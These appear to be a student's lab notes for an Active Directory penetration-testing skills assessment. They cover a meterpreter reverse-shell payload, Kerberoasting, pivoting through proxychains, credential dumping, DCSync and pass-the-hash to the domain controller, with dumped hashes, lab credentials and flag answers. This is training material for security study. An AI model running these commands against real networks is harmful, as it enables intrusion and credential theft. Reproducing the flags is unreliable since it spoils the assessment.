# AD Enum & Attacks - Assessment 1

## Given Info

A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

## Steps

### Finding the Admin's Desktop Flag

- nmap scan just to check what ports are open on the host
- Look around the web server through the web shell in order t o find the admin desktop directory.

### Elevating Access to the Reverse Shell from the Web Shell

        
- Use msfconsole to create a custom payload
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.9 lport=4444 -f exe > shell.exe`
	- Using netcat will show the connection, but you can't interact with it, so we use metasploit for a better shell
	- use exploit/multi/handler in order to listen in
	- upload the exploit to the web shell, and run it

### Getting a User's Hash

        
- We don't have a password to the local host, so we have to get a password hash and crack it
- Transfer PowerView.ps1 to the target machine and import it into powershell
- get user svn for the sql user using the following:
	- `Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat | out-File .\\\\hash.txt`
- copy the hash and use hashcat to break it

### Getting into MS01

- Running `ipconfig` shows you a second network adapter, meaning we’ll need to pivot to the internal network        
- Go to the meterpreter shell, and run the following    
	- `run autoroute -s 172.16.6.0/24`
- Then run a tcp portscan on the internal network to find hosts. Focus on 139,445 (SMB)as they are common windows ports

```bash
bg
use auxiliary/scanner/portscan/tcp
set rhosts 172.16.6.0/24
set PORTS 139,445
set threads 50
run
```

- setup SOCKS proxy and run it `use auxilliary/server/socks_proxy`
- update `/etc/proxychains.conf` to include the socks5 proxy for the local machine
- Use proxychains to attack the internal network
- `sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7` where we use the creds we got from the kerberoasting hash
- Authenticate to the smb service
	- `sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7`
- Use CME again to find the file called flag.txt
	- `sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\\users\\administrator\\desktop\\flag.txt"`

### Dumping Passwords

- `proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa`

### Attack Vectors

        
- Use powerview to evaluate attack vectors

```powershell
PS C:\\> Import-Module .\\PowerView.ps1

Import-Module .\\PowerView.ps1
PS C:\\> $sid = Convert-NameToSid tpetty
$sid = Convert-NameToSid tpetty
PS C:\\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-All
```

### Domain Takeover

        
- DCSync Attack:

```powershell
$ proxychains secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator

ProxyChains-3.1 (<http://proxychains.sf.net>)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49667-<><>-OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
Administrator:aes128-cts-hmac-sha1-96:69e27df2550c5c270eca1d8ce5c46230
Administrator:des-cbc-md5:c2d9c892f2e6f2dc
[*] Cleaning up... 
```

- Use `wmiexec.py` as `administrator` and pass the hash `aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0` to be able to connect to DC01

```powershell
$ proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0

ProxyChains-3.1 (<http://proxychains.sf.net>)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49774-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\\>hostname
DC01

C:\\>type c:\\users\\administrator\\desktop\\flag.txt
r3plicat1on_m@st3r!
```

## Creds

        
1. user: svc_sql, pass: lucky7

## Flags

1. `JusT_g3tt1ng_st@rt3d!`
2. `spn$_r0ast1ng_on_@n_0p3n_f1re`
3. `tpetty:Sup3rS3cur3D0m@inU2eR`
4. `r3plicat1on_m@st3r!`

# AD Enum & Attacks - Assessment 2**

## Given

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.

1. `SSH to with user "htb-student" and password "HTB_@cademy_stdnt!"`

## Steps

1. ssh into the machine
2. `ip a` to see if the machine is connected to any other networks: `ens224` is connected to an internal network `172.16.7.240/23`
3. Try using responder to harvest hashes

## Creds

## Flags